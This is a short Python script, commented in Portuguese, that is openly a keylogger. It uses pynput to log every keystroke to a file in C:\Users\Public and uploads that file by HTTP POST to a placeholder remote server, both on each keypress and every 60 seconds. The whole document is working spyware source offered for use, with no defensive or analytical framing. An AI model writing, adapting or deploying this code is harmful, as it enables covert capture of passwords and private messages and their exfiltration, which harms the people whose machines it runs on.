from pynput import keyboard
import requests
import time

log_file = "C:\\Users\\Public\\log.txt"
server_url = "http://seuservidor.com/logs"  # Troque pelo seu servidor

def on_press(key):
    with open(log_file, "a") as f:
        f.write(f"{key}\n")
    
    # Envia os logs em tempo real para o servidor
    with open(log_file, "rb") as f:
        requests.post(server_url, files={"file": f})

def send_logs_periodically():
    while True:
        time.sleep(60)  # Envia o log a cada 60 segundos
        with open(log_file, "rb") as f:
            requests.post(server_url, files={"file": f})

# Inicializa o keylogger
with keyboard.Listener(on_press=on_press) as listener:
    listener.start()
    send_logs_periodically()
    listener.join()
